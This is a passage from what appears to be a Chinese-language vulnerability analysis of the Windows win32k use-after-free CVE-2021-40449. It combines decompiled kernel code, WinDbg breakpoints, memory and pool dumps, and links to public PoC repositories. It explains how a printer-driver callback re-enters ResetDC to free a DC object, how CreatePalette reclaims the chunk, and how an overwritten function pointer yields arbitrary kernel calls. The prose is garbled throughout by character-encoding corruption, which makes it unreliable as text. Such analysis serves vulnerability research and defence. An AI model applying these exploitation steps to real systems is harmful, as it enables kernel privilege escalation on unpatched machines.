åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // ä¼ å…¥äº†hdcOpenDCWè¿”å›çš„HDCï¼Œä½†HmgSwapLockedHandleContentsäº¤æ¢äº†æ–°æ—§å¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œæ­¤æ—¶v6å¥æŸ„å¯¹åº”æ—§DCå¯¹è±¡ã€‚ Â·Â·Â·Â·Â·Â· è°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæ‰€ç”¨çš„ä¸¤ä¸ªå‚æ•°ä¹Ÿæ˜¯æºäºç”¨æˆ·ä¼ å…¥çš„HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nv10 = *(_QWORD *)(v8 + 48);\t_\n_v14[308] = *(_QWORD *)(v25 + 2464);\nv14[309] = *(_QWORD *)(v25 + 2472);\nv15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));\nåœ¨win32kfull!GreResetDCInternalå‡½æ•°çš„ååŠæ®µä¼šè°ƒç”¨win32kbase!DeleteDCInternalå‡½æ•°é‡Šæ”¾ä¼ å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„æ‰€å¯¹åº”çš„DCå¯¹è±¡ï¼Œåˆ°è¿™é‡Œå°±è¾¾æˆäº†use-after-freeçš„freeæ­¥éª¤ã€‚\nHDC v3; v3=a1; v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„HDC v6 = v13; if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64)); GreAcquireHmgrSemaphore(); LOBYTE(v23) = 1; HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â·Â· // åˆ é™¤HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚ bDeleteDCInternal(v6, 1i64, 0i64); å¦‚æœåœ¨é‡Šæ”¾DCå¯¹è±¡ä¹‹åï¼Œé‡æ–°ç”³è¯·DCå¯¹è±¡ç©ºé—´ï¼Œä¿®æ”¹é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆå†…å®¹ï¼Œå¹¶é€šè¿‡æŸäº›æ­¥éª¤ï¼Œè®©å†…æ ¸æ‰§è¡ŒDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å¯è¾¾åˆ°useæ­¥éª¤è®©å†…æ ¸æ‰§è¡Œä»»æ„å†…æ ¸å‡½æ•°ã€‚\næ¼æ´åˆ©ç”¨åˆ†æ POC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\nPOCä»£ç åˆ†æï¼š\rhttps://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp\nè¦åˆ©ç”¨è¯¥æ¼æ´ï¼Œéš¾ç‚¹åœ¨äºfree DCå¯¹è±¡ä¹‹åæ€ä¹ˆä½¿å¾—å†…æ ¸å†æ¬¡è°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨æ­£å¸¸GreResetDCInternalå‡½æ•°æµç¨‹ä¸­ï¼Œæ˜¯å…ˆè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå†åˆ é™¤è¿™ä¸ªå¯¹è±¡ï¼Œå³æŒ‰ç…§æ­£å¸¸æµç¨‹å³ä¸ä¼šæœ‰use-after-freeçš„æ¡ä»¶ã€‚\nåœ¨ring 3å±‚è°ƒç”¨ResetDCå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸è°ƒç”¨å‡½æ•°NtGdiResetDCï¼Œåœ¨NtGdiResetDCä¼šè°ƒç”¨æ¼æ´å‡½æ•°GreResetDCInternalï¼Œåœ¨GreResetDCInternalä¸­ä¼šè°ƒç”¨DCå¯¹è±¡é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆã€‚è¦åˆ©ç”¨è¯¥æ¼æ´å³è¦åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰å®Œæˆä¸‰æ­¥åŠ¨ä½œï¼š1ã€é‡Šæ”¾DCå¯¹è±¡2ã€é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´3ã€å®Œæˆå†…å­˜ç©ºé—´çš„å¸ƒå±€ã€‚\nåœ¨å‡½æ•°GreResetDCInternalè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ä¼šè°ƒç”¨win32kbase!hdcOpenDCWå‡½æ•°ã€‚win32kbase!hdcOpenDCWå‡½æ•°ä¼šæ‰§è¡Œæ‰“å°æœºé©±åŠ¨çš„ç”¨æˆ·æ€å›è°ƒå‡½æ•°è¡¨é‡Œé¢çš„å‡½æ•°ï¼Œè¯¥è¡¨é‡Œé¢å­˜æ”¾äº†å‡½æ•°æŒ‡é’ˆï¼Œè¯¥å‡½æ•°æŒ‡é’ˆåŸå…ˆæŒ‡å‘çš„æ˜¯é¢„å®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚åœ¨POCä¸­è¦†ç›–è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä½¿å…¶æ‰§è¡ŒPOCå®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚\nåœ¨è‡ªå®šä¹‰å›è°ƒå‡½æ•°ä¸­å†æ¬¡æ‰§è¡ŒResetDCå‡½æ•°å¹¶ä¼ å…¥åŒä¸€HDCå¥æŸ„ï¼Œåˆ™ä¼šå†æ¬¡æ‰§è¡ŒNtGdiResetDCå’ŒGreResetDCInternalå‡½æ•°ï¼Œè€Œåœ¨GreResetDCInternalçš„ååŠæ®µï¼Œä¼šé‡Šæ”¾ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å¹¶åˆ›å»ºæ–°çš„DCå¯¹è±¡ã€‚æ­¤æ—¶è¾¾åˆ°äº†freeæ­¥éª¤ã€‚\nåœ¨ç¬¬äºŒæ¬¡ResetDCè°ƒç”¨å®Œæˆåï¼ŒåŸDCå¯¹è±¡å·²è¢«é‡Šæ”¾ï¼Œæ­¤æ—¶å¯ä»¥é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å¹¶å®Œæˆå†…å­˜å¸ƒå±€ï¼Œå°†åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå’Œå‡½æ•°æŒ‡é’ˆçš„å‚æ•°çš„ä½ç½®è®¾ç½®ä¸ºæƒ³è¦æ‰§è¡Œçš„å†…æ ¸å‡½æ•°çš„åœ°å€åŠå‚æ•°ã€‚åœ¨æ‰§è¡Œå®Œç¬¬ä¸€æ¬¡å›è°ƒä¹‹åï¼ŒGreResetDCInternal å°†è°ƒç”¨åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å®Œæˆäº†ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ï¼Œæ­¤æ—¶è¾¾åˆ°äº†useæ­¥éª¤ã€‚\nå®Œæ•´è°ƒç”¨é“¾å¦‚ä¸‹å›¾ï¼š\nå…¶ä¸­æ¼æ´ç›¸å…³çš„ç±»å®šä¹‰å¦‚ä¸‹ï¼Œå‚è€ƒhttps://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97\nclass DCLEVEL { public: ... HDC hdcSave; ... } class DC : public OBJECT { public: DHPDEV dhpdev_; PDEV *ppdev_; ... HDC hdcNext_; // HDCé“¾è¡¨æŒ‡é’ˆ HDC hdcPrev_; ... DCLEVEL dclevel ... }; typedef DC *PDC; class XDCOBJ /* dco */ { public: PDC pdc; ... }; typedef XDCOBJ *PXDCOBJ; class DCOBJ : public XDCOBJ /* mdo */ { public: DCOBJ() { pdc = (PDC) NULL; } DCOBJ(HDC hdc) { vLock(hdc); } ~DCOBJ() { vUnlockNoNullSet(); } }; typedef DCOBJ *PDCOBJ; ç±»ä¹‹é—´çš„å…³ç³»å¯ä»¥ç®€åŒ–ä¸ºä¸‹å›¾ï¼š\nè°ƒè¯• freeéƒ¨åˆ† åœ¨freeéƒ¨åˆ†éœ€è¦æŠŠæˆ‘ä»¬æƒ³è¦é‡Šæ”¾çš„å†…å­˜ç©ºé—´é‡Šæ”¾ï¼Œå¹¶è®©åé¢çš„useéƒ¨åˆ†æˆåŠŸç”³è¯·åˆ°è¿™å—å†…å­˜ç©ºé—´ã€‚\nè°ƒè¯•ç¯å¢ƒï¼šè™šæ‹Ÿæœºwindows 10 1607ã€ç‰©ç†æœºwindows 10 2004\nPOC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\næ–­ç‚¹:\nbp win32kfull!NtGdiResetDC bp win32kfull!NtGdiResetDC+0xc1 \u0026#34;è°ƒç”¨GreResetDCInternalå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x3a \u0026#34;è°ƒç”¨DCOBJæ„é€ å‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x116 \u0026#34;è°ƒç”¨_imp_hdcOpenDCWå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x136 \u0026#34;ç¬¬äºŒæ¬¡DCOBJ\u0026#34; bp win32kfull!GreResetDCInternal+0x1b5 \u0026#34;è°ƒç”¨DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆ\u0026#34; bp win32kfull!GreResetDCInternal+0x1d1 \u0026#34;è°ƒç”¨HmgSwapLockedHandleå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x20d \u0026#34;è°ƒç”¨_imp_bDeleteDCInternalå‡½æ•°\u0026#34; bp cve_2021_40449!hook_DrvEnablePDEV+0x12a \u0026#34;å¾ªç¯è°ƒç”¨\u0026#34; bp win32kbase!PALMEMOBJ::bCreatePalette \u0026#34;è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePalette\u0026#34; è¿è¡ŒPOCï¼Œæ–­ç‚¹bp win32kfull!NtGdiResetDCè§¦å‘æ­¤æ—¶ä¼ å…¥çš„å¥æŸ„ä¸ºrcx=00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ä¼ å…¥å„ä¸ªå‚æ•°ä¸ºrcx=00000000092105f1 rdx=0000000000000000 r8=ffffb101aadf2a44 å³ç¬¬ä¸€ä¸ªå¥æŸ„å€¼ä¸º00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨æ„é€ å‡½æ•°ï¼Œåˆ©ç”¨DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ï¼Œæ­¤æ—¶rbxå­˜æ”¾DCOå¯¹è±¡çš„åœ°å€ï¼Œ\næ ¹æ®æ¼æ´å½¢æˆåˆ†æçš„è®¡ç®—å…¬å¼ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å¾—åˆ°DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„åœ°å€ä¸ºï¼šffffd548a1f10c30\n1: kd\u0026gt; dq rax ffffb101`aadf29c0 ffffd50e`041fd010 00000000`00000001 ffffb101`aadf29d0 00000268`6e766b20 000000d7`97aff680 ffffb101`aadf29e0 00000000`00000000 00000000`092105f1 ffffb101`aadf29f0 00000000`00000000 ffffd50e`041fb030 ffffb101`aadf2a00 ffffb101`aadf2b80 ffffd548`a1f18fe6 ffffb101`aadf2a10 00000000`00000001 00000000`00000000 ffffb101`aadf2a20 ffffb101`aadf2a44 ffffd50e`041fb030 ffffb101`aadf2a30 000000d7`97aff5d0 00000000`00000000 // rbxå­˜æ”¾äº†æ„é€ å‡½æ•°äº§ç”Ÿçš„DCOå¯¹è±¡åœ°å€ 1: kd\u0026gt; dq rbx ffffd50e`041fd010 00000000`092105f1 80000001`00000000 ffffd50e`041fd020 ffffd800`b45ad780 00000268`6e75ea10 ffffd50e`041fd030 00100010`00000000 00000000`00000000 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 // ffffd50e`041fd010ä¸ºrbxçš„å€¼ï¼Œæ­¤å¤„ffffd50e`041fd010+0x30ä¸ºPDCçš„åœ°å€ï¼ŒPDCæŒ‡å‘DCå¯¹è±¡å³DCå¯¹è±¡åœ°å€ä¸ºffffd50e`00052030 // è®¡ç®—å…¬å¼ *(dcoåœ°å€+0x30)=dcåœ°å€ 1: kd\u0026gt; dq ffffd50e`041fd010+0x30 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 ffffd50e`041fd090 00000000`00000000 00000000`00000000 ffffd50e`041fd0a0 ffffd50e`00001a10 ffffd50e`00004cb0 ffffd50e`041fd0b0 ffffd50e`000105f0 00000000`00000000 // ffffd50e`00052030+0xad0å¤„ä¸ºDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªå‡½æ•° // è®¡ç®—å…¬å¼ *(dcåœ°å€ +0xad0)=å‡½æ•°åœ°å€ 1: kd\u0026gt; dq ffffd50e`00052030+0xad0 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 ffffd50e`00052b10 00000000`00000000 00000000`00000000 ffffd50e`00052b20 00000000`00000000 ffffd548`a1f10930 ffffd50e`00052b30 00000000`00000000 ffffd548`a1f11dc0 ffffd50e`00052b40 ffffd548`a1f0e6b0 ffffd548`a1f11b00 ffffd50e`00052b50 00000000`00000000 ffffd548`a1f0cd70 ffffd50e`00052b60 ffffd548`a1f0d1f0 ffffd548`a1f112f0 ffffd50e`00052b70 00000000`00000000 00000000`00000000 // ä»¥ä¸‹ä¸ºå‡½æ•°çš„æ±‡ç¼– 1: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx ä¹‹åé€šè¿‡hdcOpenDCWå‡½æ•°è°ƒç”¨ç”¨æˆ·æ¨¡å¼çš„å›è°ƒå‡½æ•°ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCå‡½æ•°ï¼Œæ­¤æ—¶ä¼ å…¥çš„HDCå’Œç¬¬ä¸€æ¬¡è°ƒç”¨ResetDCçš„æ˜¯åŒä¸€ä¸ªå¥æŸ„ã€‚\nç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ï¼Œä¼ å…¥åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œå³å¯¹åº”åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\n0: kd\u0026gt; t win32kfull!GreResetDCInternal: ffffd548`a1f03e58 488bc4 mov rax,rsp 1: kd\u0026gt; rrcx rcx=00000000092105f1 ç¬¬äºŒæ¬¡è°ƒç”¨DCOBJæ„é€ å‡½æ•°æ—¶ï¼Œç”±äºä¼ å…¥çš„æ˜¯åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œæ‰€ä»¥HDCå¥æŸ„å¼•ç”¨æ¬¡æ•°+1ï¼ŒåŒæ—¶ä¸¤æ¬¡è°ƒç”¨æ„é€ å‡½æ•°æ„é€ çš„å¯¹è±¡å…³è”åˆ°åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\nä¹‹åç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!_imp_hdcOpenDCWå‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å†…æ‰§è¡Œæ”¿ç­–å›è°ƒå‡½æ•°ï¼Œwin32kfull!imp_hdcOpenDCWè¿”å›ä¸€ä¸ªHDCå¥æŸ„å€¼ä¸º0000000003210041ï¼Œå³åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„DCå¯¹è±¡ã€‚ä¹‹åé€šè¿‡æ–°åˆ›å»ºçš„DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ã€‚\nåœ¨win32kfull!GreResetDCInternalååŠæ®µä¼šè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsäº¤æ¢ç¬¬ä¸€ä¸ªHDCå¥æŸ„å’Œç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!imp_hdcOpenDCWåˆ›å»ºçš„HDCå¥æŸ„ã€‚\nè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsä¹‹åä¸¤ä¸ªå¥æŸ„å¯¹åº”çš„DCå†…å®¹ä¸ºå·²ç»å‘ç”Ÿäº†äº¤æ¢\n// ä»¥ä¸‹å†…å®¹ä¸ºæ—§DCå¯¹è±¡ï¼Œä½†æ˜¯å¥æŸ„ä¸ºæ–°å¥æŸ„ 1: kd\u0026gt; dq ffffd50e041fd010 ffffd50e`041fd010 00000000`03210041 80000001`00000000 ...... 1: kd\u0026gt; dq ffffd50e03fee010 // ä»¥ä¸‹å†…å®¹ä¸ºæ–°DCå¯¹è±¡ï¼Œä½†å¥æŸ„ä¸ºæ—§å¥æŸ„ ffffd50e`03fee010 00000000`092105f1 80000002`00000000 ...... ä¹‹åè°ƒç”¨win32kfull!_imp_bDeleteDCInternalä¼ å…¥HDCå¥æŸ„ï¼Œè¯¥å‡½æ•°ä¼šé‡Šæ”¾HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œè€Œæ­¤æ—¶ä¼ å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„ä¸ºç¬¬äºŒæ¬¡è°ƒç”¨hdcOpenDCWå‡½æ•°è¿”å›çš„å¥æŸ„ï¼Œä½†ä¹‹å‰äº¤æ¢è¿‡æ–°æ—§å¥æŸ„ï¼Œæ‰€ä»¥å®é™…ä¸Šé‡Šæ”¾çš„æ˜¯æ—§HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nä¹‹å‰è®¡ç®—å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬çŸ¥é“DCO +0x30æ˜¯æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆï¼Œæ‰€ä»¥åœ¨è°ƒç”¨win32kfull!_imp_bDeleteDCInternalå‡½æ•°ä¹‹åï¼ŒåŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾ï¼Œè¾¾æˆäº†use-after-freeçš„ç¬¬ä¸€æ­¥freeã€‚\nfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\n0: kd\u0026gt; dq ffffd50e041fd010+0x30 // å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ...... 0: kd\u0026gt; !pool ffffd50e`00052030 // DCå¯¹è±¡çš„å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œå¤§å°ä¸ºe30 Pool page ffffd50e00052030 region is Paged session pool *ffffd50e00052000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffffd50e00052e30 size: 10 previous size: e30 (Free) Free ffffd50e00052e40 size: 1c0 previous size: 10 (Allocated) Usqu ä¹‹ååªéœ€è¦ç”³è¯·è¿™å—å†…å­˜ç©ºé—´å¹¶æ„é€ ï¼Œåˆšåˆ é™¤çš„æ—¶å€™ï¼Œè™½ç„¶DCå¯¹è±¡å·²ç»è¢«é‡Šæ”¾ï¼Œä½†å‡½æ•°æŒ‡é’ˆè¿˜æ˜¯æŒ‡å‘æ­£ç¡®çš„å‡½æ•°åœ°å€ï¼Œæ¥ä¸‹æ¥å°±è¦ç”³è¯·ç©ºé—´ï¼Œè¦†ç›–è¿™å—å†…å­˜ç©ºé—´çš„å‡½æ•°æŒ‡é’ˆçš„å€¼å³å¯ã€‚\n0: kd\u0026gt; dq ffffd50e041fd010+0x30\t// å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 0: kd\u0026gt; dq ffffd50e`00052030+0xad0\t// å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆ ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 0: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx use éƒ¨åˆ† æ³¨ï¼šæ­¤éƒ¨åˆ†ä¸ºç¬¬äºŒæ¬¡è°ƒè¯•ï¼Œæ‰€ä»¥å¥æŸ„ã€å†…å­˜åœ°å€å’Œå‰éƒ¨åˆ†ä¸ä¸€æ ·ã€‚\nåœ¨pocé‡Œé¢ä¼šè°ƒç”¨CreatePaletteå‡½æ•°ï¼Œè¯¥æ­¤å‡½æ•°ä¼šç”³è¯·å†…æ ¸å †ï¼Œ\nç¬¬ä¸€ä¸ªå¥æŸ„rcx=0000000015213372\n// ç¬¬ä¸€ä¸ªDCOå¯¹è±¡ 0: kd\u0026gt; dq rbx DBGHELP: SharedUserData - virtual symbol module ffff885e`847d2620 00000000`15213372 80000001`00000000 ...... // ç¬¬ä¸€ä¸ªPDC æŒ‡å‘DCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`847d2620+0x30 ffff885e`847d2650 ffff885e`80063030 00000000`00000000 ...... // ç¬¬ä¸€ä¸ªDCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`80063030 ffff885e`80063030 00000000`00000000 00000000`00000000 ffff885e`80063040 00000000`00000000 ffff885e`80046010 ffff885e`80063050 00000001`00000001 ffff885e`80063030 ffff885e`80063060 00000000`00000000 00000000`00008180 ffff885e`80063070 ffffb48d`a36b4e50 00000000`00000000 ffff885e`80063080 00000000`00000000 00000000`00000000 ffff885e`80063090 00000000`00000000 00000000`00000000 ffff885e`800630a0 00000000`00000000 00000000`00000000 ç¬¬äºŒä¸ªå¥æŸ„rax=0000000001211b60\n1: kd\u0026gt; dq rdx DBGHELP: SharedUserData - virtual symbol module ffff885e`84121620 00000000`01211b60 80000001`00000000 ...... 1: kd\u0026gt; dq rdx+0x30 ffff885e`84121650 ffff885e`8006b030 00000000`00000000 ...... 1: kd\u0026gt; dq ffff885e`8006b030 ffff885e`8006b030 00000000`00000000 00000000`00000000 ffff885e`8006b040 00000000`00000000 ffff885e`80063030 ffff885e`8006b050 00000001`00000001 ffff885e`8006b030 ffff885e`8006b060 00000000`00000000 00000000`00008180 ffff885e`8006b070 ffffb48d`a317b8b0 00000000`00000000 ffff885e`8006b080 00000000`00000000 00000000`00000000 ffff885e`8006b090 00000000`00000000 00000000`00000000 ffff885e`8006b0a0 00000000`00000000 00000000`00000000 åœ¨DeleteDCInternelè°ƒç”¨ä¹‹åç¬¬ä¸€ä¸ªDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾\n0: kd\u0026gt; !pool ffff885e`80063030 // æ³¨æ„ï¼Œæ­¤æ—¶DCå¯¹è±¡åœ°å€è·ç¦»å †å¤´åœ°å€ä¸º0x30å¤§å° Pool page ffff885e80063030 region is Paged session pool *ffff885e80063000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffff885e80063e30 size: 70 previous size: e30 (Free) Free ffff885e80063ea0 size: b0 previous size: 70 (Free ) Usqm ffff885e80063f50 size: b0 previous size: b0 (Allocated) Usqm æ ¹æ®è°ƒè¯•ï¼Œå¯ä»¥å¾—çŸ¥é‡Šæ”¾çš„DCå¯¹è±¡å†…å­˜å¤§å°ä¸º0xe30ï¼Œæ‰€ä»¥è¦è¦†ç›–å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œæ‰€ç”³è¯·çš„å†…å­˜ä¹Ÿè¦åˆšåˆšå¥½æˆ–è€…æ¥è¿‘è¿™å—å†…å­˜å¤§å°æ‰æœ‰å¯èƒ½ç”³è¯·åˆ°ã€‚åœ¨pocé‡Œé¢ï¼Œä½¿ç”¨CreatePaletteç”³è¯·è¿™å—å†…æ ¸å †ã€‚è¿™ä¸ªå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å‡½æ•°win32kfull!NtGdiCreatePaletteInternalï¼Œè¯¥å‡½æ•°è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePaletteåˆ›é€ Paletteå¯¹è±¡ï¼Œwin32kbase!PALMEMOBJ::bCreatePaletteä¼šè°ƒç”¨AllocateObjectä¸ºæ–°å¯¹è±¡ç”³è¯·ç©ºé—´ï¼Œæœ€ç»ˆé€šè¿‡è°ƒç”¨ExAllocatePoolWithTagå‡½æ•°åˆ†é…å †ç©ºé—´ï¼Œæ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n0: kd\u0026gt; kb # RetAddr : Call Site 00 ffff880c`b95d39f4 : win32kbase!Win32AllocPool 01 ffff880c`b95d0042 : win32kbase!AllocateObject+0xc4 02 ffff880c`b9309ecc : win32kbase!PALMEMOBJ::bCreatePalette+0xb2 03 fffff800`b175a193 : win32kfull!NtGdiCreatePaletteInternal+0xcc 04 00007ffe`a2cb2604 : nt!KiSystemServiceCopyEnd+0x13 05 00007ff7`e44c2fe1 : win32u!NtGdiCreatePaletteInternal+0x14 06 00000000`00000d94 : cve_2021_40449!createPaletteofSize1+0xd1 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 71] ....... 2e 00007ffe`a2e9b26f : 0x000000d1`a374ef69 2f 00007ffe`a39e1a4a : gdi32full!GdiPrinterThunk+0x21f 30 00007ffe`a61889e4 : USER32!__ClientPrinterThunk+0x3a 31 00007ffe`a2cb6dc4 : ntdll!KiUserCallbackDispatcherContinue 32 00007ffe`a2e7edda : win32u!NtGdiResetDC+0x14 33 00007ffe`a3682371 : gdi32full!ResetDCWInternal+0x17a 34 00007ff7`e44c3296 : GDI32!ResetDCW+0x31 35 00000000`00000000 : cve_2021_40449!main+0x146 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 685] win32kbase!Win32AllocPoolä»£ç å¦‚ä¸‹ï¼Œæœ€ç»ˆæ˜¯é€šè¿‡è°ƒç”¨ExAllocatePoolWithTagç”³è¯·å 